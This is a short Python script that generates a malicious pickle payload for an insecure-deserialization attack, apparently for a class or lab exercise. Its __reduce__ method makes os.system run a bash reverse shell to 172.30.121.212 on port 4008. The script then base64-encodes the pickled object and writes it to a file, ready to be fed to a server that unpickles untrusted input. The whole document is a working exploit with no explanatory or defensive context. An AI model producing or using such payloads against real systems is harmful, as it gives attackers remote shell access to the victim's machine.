import pickle
import base64


class VulnPickle(object):
    def __reduce__(self):
        import os
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/172.30.121.212/4008 0>&1'",))


a = pickle.dumps(VulnPickle())
a = base64.urlsafe_b64encode(a)
with open('serial_Nhom8_python', 'wb') as f:
    f.write(a)
